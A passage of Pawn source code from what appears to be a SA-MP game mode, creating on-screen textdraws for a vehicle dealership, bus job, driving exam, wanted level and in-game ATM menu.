	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][6], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][6], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][6], 0);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][6], 5);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][6], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][6], 0);
	PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], 411);
	PlayerTextDrawSetPreviewRot(playerid, DealerShipTD[playerid][6], 0.000000, 0.000000, 30.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], 1, 1);

	DealerShipTD[playerid][7] = CreatePlayerTextDraw(playerid, 160.500000, 385.974945, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][7], 118.000000, 44.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][7], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][7], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][7], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][7], 0);

	DealerShipTD[playerid][8] = CreatePlayerTextDraw(playerid, 158.598632, 387.487670, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][8], 118.389869, 40.919677);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][8], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][8], 320084479);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][8], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][8], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][8], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][8], 0);

	DealerShipTD[playerid][10] = CreatePlayerTextDraw(playerid, 159.200042, 390.587432, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][10], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][10], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][10], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][10], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][10], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][10], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][10], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][10], true);

	DealerShipTD[playerid][11] = CreatePlayerTextDraw(playerid, 187.700042, 390.587432, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][11], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][11], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][11], -16776961);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][11], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][11], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][11], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][11], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][11], true);

	DealerShipTD[playerid][12] = CreatePlayerTextDraw(playerid, 215.601715, 390.412475, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][12], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][12], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][12], 16777215);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][12], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][12], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][12], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][12], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][12], true);

	DealerShipTD[playerid][13] = CreatePlayerTextDraw(playerid, 245.103515, 390.512481, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][13], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][13], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][13], -5963521);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][13], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][13], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][13], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][13], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][13], true);

	DealerShipTD[playerid][14] = CreatePlayerTextDraw(playerid, 159.200042, 408.888549, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][14], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][14], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][14], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][14], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][14], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][14], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][14], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][14], true);

	DealerShipTD[playerid][15] = CreatePlayerTextDraw(playerid, 187.700042, 408.788543, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][15], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][15], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][15], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][15], -16776961);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][15], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][15], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][15], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][15], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][15], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][15], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][15], true);

	DealerShipTD[playerid][16] = CreatePlayerTextDraw(playerid, 215.601715, 408.813598, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][16], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][16], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][16], 16777215);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][16], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][16], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][16], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][16], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][16], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][16], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][16], true);

	DealerShipTD[playerid][17] = CreatePlayerTextDraw(playerid, 245.603515, 408.913604, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][17], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][17], 23.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][17], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][17], -5963521);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][17], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][17], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][17], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][17], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][17], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][17], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][17], true);

	DealerShipTD[playerid][18] = CreatePlayerTextDraw(playerid, 159.400054, 370.024932, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][18], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][18], 119.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][18], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][18], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][18], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][18], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][18], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][18], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][18], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][18], 0);

	DealerShipTD[playerid][19] = CreatePlayerTextDraw(playerid, 157.899841, 370.937835, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][19], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][19], 119.039794, 16.290029);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][19], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][19], 320084479);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][19], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][19], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][19], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][19], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][19], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][19], 0);

	DealerShipTD[playerid][20] = CreatePlayerTextDraw(playerid, 187.099975, 374.112548, "BUY");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][20], 0.214499, 1.000625);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][20], 2);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][20], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][20], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][20], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][20], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][20], 2);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][20], 1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][20], 0);

	DealerShipTD[playerid][21] = CreatePlayerTextDraw(playerid, 163.099975, 373.724945, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][21], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][21], 48.000000, 11.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][21], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][21], 16711935);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][21], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][21], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][21], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][21], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][21], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][21], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][21], true);

	DealerShipTD[playerid][22] = CreatePlayerTextDraw(playerid, 217.100616, 373.675048, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][22], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][22], 48.000000, 11.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][22], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][22], -16776961);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][22], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][22], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][22], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][22], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][22], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][22], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][22], true);

	DealerShipTD[playerid][23] = CreatePlayerTextDraw(playerid, 240.899963, 374.287506, "CANCEL");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][23], 0.214499, 1.000625);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][23], 2);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][23], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][23], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][23], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][23], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][23], 2);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][23], 1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][23], 0);

	FindT[playerid] = CreatePlayerTextDraw(playerid, 280.000000, 377.000000, " ");
	PlayerTextDrawLetterSize(playerid, FindT[playerid], 0.470000, 1.500000);
	PlayerTextDrawSetShadow(playerid, FindT[playerid], 0);
	PlayerTextDrawSetOutline(playerid, FindT[playerid], 1);
	PlayerTextDrawFont(playerid, FindT[playerid], 2);
	
	BusJob[playerid] = CreatePlayerTextDraw(playerid, 260.999847, 367.526092, "~y~BUS DRIVER JOB");
	PlayerTextDrawLetterSize(playerid, BusJob[playerid], 0.350333, 1.815703);
	PlayerTextDrawAlignment(playerid, BusJob[playerid], 1);
	PlayerTextDrawColor(playerid, BusJob[playerid], -1);
	PlayerTextDrawSetShadow(playerid, BusJob[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BusJob[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, BusJob[playerid], 255);
	PlayerTextDrawFont(playerid, BusJob[playerid], 2);
	PlayerTextDrawSetProportional(playerid, BusJob[playerid], 1);

	BusCheck[playerid] = CreatePlayerTextDraw(playerid, 260.999969, 382.459259, " ");
	PlayerTextDrawLetterSize(playerid, BusCheck[playerid], 0.281666, 1.989928);
	PlayerTextDrawAlignment(playerid, BusCheck[playerid], 1);
	PlayerTextDrawColor(playerid, BusCheck[playerid], -1);
	PlayerTextDrawSetShadow(playerid, BusCheck[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BusCheck[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, BusCheck[playerid], 255);
	PlayerTextDrawFont(playerid, BusCheck[playerid], 2);
	PlayerTextDrawSetProportional(playerid, BusCheck[playerid], 1);

	DMVexam[playerid] = CreatePlayerTextDraw(playerid, 200.799987, 356.906677, "~y~DRIVING SCHOOL EXAM");
	PlayerTextDrawLetterSize(playerid, DMVexam[playerid], 0.497200, 1.950933);
	PlayerTextDrawAlignment(playerid, DMVexam[playerid], 1);
	PlayerTextDrawColor(playerid, DMVexam[playerid], -1);
	PlayerTextDrawSetShadow(playerid, DMVexam[playerid], 0);
	PlayerTextDrawSetOutline(playerid, DMVexam[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, DMVexam[playerid], 255);
	PlayerTextDrawFont(playerid, DMVexam[playerid], 2);
	PlayerTextDrawSetProportional(playerid, DMVexam[playerid], 1);

	DMVcheck[playerid] = CreatePlayerTextDraw(playerid, 201.600006, 373.333343, " ");
	PlayerTextDrawLetterSize(playerid, DMVcheck[playerid], 0.467599, 2.152534);
	PlayerTextDrawAlignment(playerid, DMVcheck[playerid], 1);
	PlayerTextDrawColor(playerid, DMVcheck[playerid], -1);
	PlayerTextDrawSetShadow(playerid, DMVcheck[playerid], 0);
	PlayerTextDrawSetOutline(playerid, DMVcheck[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, DMVcheck[playerid], 255);
	PlayerTextDrawFont(playerid, DMVcheck[playerid], 2);
	PlayerTextDrawSetProportional(playerid, DMVcheck[playerid], 1);

	WantedText[playerid] = CreatePlayerTextDraw(playerid, 504.000000, 122.000000, "WANTED SCADE IN:");
	PlayerTextDrawBackgroundColor(playerid, WantedText[playerid], 255);
	PlayerTextDrawFont(playerid, WantedText[playerid], 1);
	PlayerTextDrawLetterSize(playerid, WantedText[playerid], 0.219998, 1.800000);
	PlayerTextDrawColor(playerid, WantedText[playerid], -1);
	PlayerTextDrawSetOutline(playerid, WantedText[playerid], 1);
	PlayerTextDrawSetProportional(playerid, WantedText[playerid], 1);

	UndercoverText[playerid] = CreatePlayerTextDraw(playerid, 250.000000, 374.000000, "~r~You are undercover");
	PlayerTextDrawBackgroundColor(playerid, UndercoverText[playerid], 255);
	PlayerTextDrawFont(playerid, UndercoverText[playerid], 3);
	PlayerTextDrawLetterSize(playerid, UndercoverText[playerid], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid, UndercoverText[playerid], -1);
	PlayerTextDrawSetOutline(playerid, UndercoverText[playerid], 0);
	PlayerTextDrawSetProportional(playerid, UndercoverText[playerid], 1);
	PlayerTextDrawSetShadow(playerid, UndercoverText[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, UndercoverText[playerid], 0);

	Reportss[playerid] = CreatePlayerTextDraw(playerid, 142.000000, 436.750000, " ");
	PlayerTextDrawLetterSize(playerid, Reportss[playerid], 0.230000, 0.873749);
	PlayerTextDrawAlignment(playerid, Reportss[playerid], 3);
	PlayerTextDrawColor(playerid, Reportss[playerid], -1);
	PlayerTextDrawSetShadow(playerid, Reportss[playerid], 0);
	PlayerTextDrawSetOutline(playerid, Reportss[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, Reportss[playerid], 255);
	PlayerTextDrawFont(playerid, Reportss[playerid], 1);
	PlayerTextDrawSetProportional(playerid, Reportss[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Reportss[playerid], 0);
	
	ATMTD[playerid][0] = CreatePlayerTextDraw(playerid, 467.500000, 128.749984, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][0], 164.000000, 146.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][0], 168430335);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][0], 0);

	ATMTD[playerid][1] = CreatePlayerTextDraw(playerid, 598.299194, 132.250045, "ATM");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][1], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][1], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][1], -1061109505);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][1], 0);

	ATMTD[playerid][2] = CreatePlayerTextDraw(playerid, 620.799194, 181.250045, "Balance inquiry ~G~-");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][2], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][2], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][2], -1061109505);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][2], 0);

	ATMTD[playerid][3] = CreatePlayerTextDraw(playerid, 627.197631, 199.151138, "CASH WITHDRAWAL ~G~-");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][3], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][3], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][3], -1061109505);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][3], 0);

	ATMTD[playerid][4] = CreatePlayerTextDraw(playerid, 616.000366, 217.352249, "MONEY TRANSFER ~G~-");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][4], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][4], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][4], -1061109505);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][4], 0);

	ATMTD[playerid][5] = CreatePlayerTextDraw(playerid, 480.000000, 179.700012, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][5], 146.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][5], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][5], 89089535);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][5], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][5], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][5], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, ATMTD[playerid][5], true);

	ATMTD[playerid][6] = CreatePlayerTextDraw(playerid, 479.899993, 198.601165, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][6], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][6], 147.309280, 17.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][6], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][6], 89089535);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][6], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][6], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][6], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid, ATMTD[playerid][6], true);

	ATMTD[playerid][7] = CreatePlayerTextDraw(playerid, 480.000000, 217.502319, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][7], 146.000000, 17.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][7], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][7], 89089535);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][7], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid, ATMTD[playerid][7], true);

	ATMTD[playerid][8] = CreatePlayerTextDraw(playerid, 578.500366, 247.269699, "CANCEL");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][8], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][8], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][8], -1061109505);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][8], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][8], 1);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][8], 0);

	ATMTD[playerid][9] = CreatePlayerTextDraw(playerid, 485.625000, 152.083328, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ATMTD[playerid][9], 129.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][9], 1);
	PlayerTextDrawColor(playerid, ATMTD[playerid][9], -1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][9], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][9], 0);

	ATMTD[playerid][10] = CreatePlayerTextDraw(playerid, 608.500000, 159.812515, "ATM ~R~T-Zone");
	PlayerTextDrawLetterSize(playerid, ATMTD[playerid][10], 0.227000, 0.698749);
	PlayerTextDrawAlignment(playerid, ATMTD[playerid][10], 3);
	PlayerTextDrawColor(playerid, ATMTD[playerid][10], 23295);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, ATMTD[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, ATMTD[playerid][10], 255);
	PlayerTextDrawFont(playerid, ATMTD[playerid][10], 2);
	PlayerTextDrawSetProportional(playerid, ATMTD[playerid][10], 1);
	PlayerTextDrawSetShadow(playerid, ATMTD[playerid][10], 0);

	ATMTD[playerid][11] = CreatePlayerTextDraw(playerid, 476.875000, 247.252288, "LD_SPAC:white");
